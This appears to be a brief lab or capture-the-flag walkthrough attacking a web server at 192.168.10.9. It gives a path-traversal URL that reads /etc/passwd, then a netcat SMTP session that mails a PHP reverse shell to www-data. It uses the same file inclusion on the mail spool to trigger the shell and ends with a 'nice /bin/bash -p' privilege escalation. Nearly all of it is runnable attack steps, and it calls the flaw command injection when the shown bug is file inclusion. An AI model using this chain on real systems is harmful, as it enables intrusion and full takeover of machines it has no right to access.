so found a cmd injection on port 80. but can only read /etc/passwd using this:
http://192.168.10.9/production/sendcommand.php?out=../../../../../../../../etc/passwd

we use smpt to gain a reverse shell back.
#How?
well first connect over netcat:
>nc 192.168.10.9 25
type:
>helo (sets a name)
type:
>MAIL FROM: hey@mail.org (sets mailing address)
type:
>RCPT TO: www-data (so www-data will recieve the mail)
type:
>DATA (then add the php code from pentestmonkey php rev shell)
type:
>PRESS ENTER, then a dot {.}, then PRESS ENTER AGAIN
type:
>exit(everything is in order to begin exploitation process)

then use the same lfi to read the mail and activate the shell:
>http://192.168.10.9/production/sendcommand.php?out=../../../../../../../../var/spool/mail/www-data

this will activate rev shell

then sudo using nice
>nice /bin/bash -p

boom